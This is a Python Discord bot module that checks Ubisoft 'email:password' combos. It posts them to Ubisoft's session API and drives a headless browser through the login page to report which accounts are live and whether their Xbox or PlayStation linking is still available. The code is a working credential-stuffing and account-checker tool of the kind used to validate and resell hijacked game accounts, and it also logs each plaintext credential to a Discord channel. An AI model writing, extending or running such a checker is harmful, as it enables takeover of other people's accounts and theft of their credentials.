import discord
from discord import app_commands
from discord.ext import commands
import aiohttp
import base64
import utils
import database as db
from playwright.async_api import async_playwright

# replace this when u get the new app id
UBI_APP_ID = "39b0e8b8-33df-41da-a9e1-b459f22dbcf2"

class Checker(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    async def log_to_channel(self, interaction: discord.Interaction, embed: discord.Embed):
        log_channel_id = db.get_config("check_log_channel")
        if log_channel_id:
            try:
                channel = self.bot.get_channel(int(log_channel_id))
                if channel:
                    await channel.send(embed=embed)
            except Exception:
                pass

    @app_commands.command(name="check", description="Check if a Ubisoft email:pass account is valid.")
    @app_commands.describe(account="Format: email:password")
    async def check(self, interaction: discord.Interaction, account: str):
        await interaction.response.defer(ephemeral=True)
        
        if ":" not in account:
            return await interaction.followup.send("❌ Invalid format. Use `email:password`.", ephemeral=True)

        email, password = account.split(":", 1)
        b64_auth = base64.b64encode(f"{email}:{password}".encode('utf-8')).decode('utf-8')
        
        headers = {
            "Content-Type": "application/json",
            "Ubi-AppId": UBI_APP_ID,
            "Authorization": f"Basic {b64_auth}",
            "User-Agent": "Mozilla/5.0"
        }

        embed = discord.Embed(color=0x5865F2, title="🔍 Account Check", description=f"**User:** {interaction.user.mention}\n**Type:** Ubisoft Email:Pass\n**Input:** `{account}`")
        
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post("https://public-ubiservices.ubi.com/v3/profiles/sessions", headers=headers, json={"rememberMe": True}, timeout=5) as res:
                    if res.status == 200:
                        embed.color = 0x57F287
                        embed.add_field(name="Status", value="✅ Valid")
                        await interaction.followup.send("✅ Account is valid.", ephemeral=True)
                    elif res.status == 401:
                        embed.color = 0xED4245
                        embed.add_field(name="Status", value="❌ Invalid / 2FA")
                        await interaction.followup.send("❌ Account is dead or requires 2FA.", ephemeral=True)
                    else:
                        embed.color = 0xFEE75C
                        embed.add_field(name="Status", value=f"⚠️ Error {res.status}")
                        await interaction.followup.send(f"⚠️ Error: HTTP {res.status}", ephemeral=True)
        except Exception as e:
            embed.color = 0xED4245
            embed.add_field(name="Status", value=f"⚠️ Network Error")
            await interaction.followup.send(f"⚠️ Network error: {e}", ephemeral=True)

        await self.log_to_channel(interaction, embed)

    @app_commands.command(name="checkprelink", description="Check if a Ubisoft account has an Xbox/PS linked.")
    @app_commands.describe(account="Ubisoft Email:Pass", console="Xbox or PlayStation")
    @app_commands.choices(console=[
        app_commands.Choice(name="Xbox", value="xbox"),
        app_commands.Choice(name="PlayStation", value="ps"),
    ])
    async def checkprelink(self, interaction: discord.Interaction, account: str, console: str):
        await interaction.response.defer(ephemeral=True)

        if ":" not in account:
            return await interaction.followup.send("❌ Invalid format. Use `email:password`.", ephemeral=True)

        email, password = account.split(":", 1)
        await interaction.followup.send("⏳ **Booting browser...** This takes about 10-15 seconds.", ephemeral=True)

        embed = discord.Embed(color=0x5865F2, title="🎮 Pre-Linked Check", description=f"**User:** {interaction.user.mention}\n**Console:** {console.capitalize()}\n**Input:** `{account}`")

        try:
            async with async_playwright() as p:
                # launch hidden browser
                browser = await p.chromium.launch(headless=True)
                page = await browser.new_page()
                
                # go to ubisoft login
                await page.goto("https://account.ubisoft.com/en-US/login", timeout=15000)
                
                # fill creds
                await page.fill('input[name="email"]', email)
                await page.fill('input[name="password"]', password)
                await page.click('button[type="submit"]')
                
                # wait for redirect or error
                try:
                    await page.wait_for_url("**/account.ubisoft.com/**", timeout=8000)
                except:
                    pass # if it fails, we'll check the URL below
                
                if "login" in page.url.lower():
                    # still on login page = dead / 2FA
                    embed.color = 0xED4245
                    embed.add_field(name="Status", value="❌ Invalid Login / 2FA required")
                    await interaction.followup.send("❌ Could not log in. Dead account or 2FA enabled.", ephemeral=True)
                else:
                    # we are logged in! go to account linking
                    await page.goto("https://account.ubisoft.com/en-US/account-linking", timeout=15000)
                    await page.wait_for_timeout(3000) # let the page load the console list
                    
                    # get page text to see if the console is there
                    page_text = await page.content()
                    
                    if console == "xbox":
                        if "Xbox" in page_text and "Link" in page_text:
                            embed.color = 0x57F287
                            embed.add_field(name="Status", value="✅ Logged in & Xbox option is present.")
                            await interaction.followup.send("✅ Account is valid and Xbox linking is available.", ephemeral=True)
                        else:
                            embed.color = 0xFEE75C
                            embed.add_field(name="Status", value="⚠️ Logged in, but no Xbox link option found.")
                            await interaction.followup.send("⚠️ Logged in, but couldn't find Xbox linking.", ephemeral=True)
                    elif console == "ps":
                        if "PlayStation" in page_text and "Link" in page_text:
                            embed.color = 0x57F287
                            embed.add_field(name="Status", value="✅ Logged in & PS option is present.")
                            await interaction.followup.send("✅ Account is valid and PS linking is available.", ephemeral=True)
                        else:
                            embed.color = 0xFEE75C
                            embed.add_field(name="Status", value="⚠️ Logged in, but no PS link option found.")
                            await interaction.followup.send("⚠️ Logged in, but couldn't find PS linking.", ephemeral=True)
                            
                await browser.close()

        except Exception as e:
            embed.color = 0xED4245
            embed.add_field(name="Status", value="⚠️ Error in browser")
            await interaction.followup.send(f"⚠️ Browser error: {str(e)}", ephemeral=True)
            
        await self.log_to_channel(interaction, embed)

async def setup(bot):
    await bot.add_cog(Checker(bot))
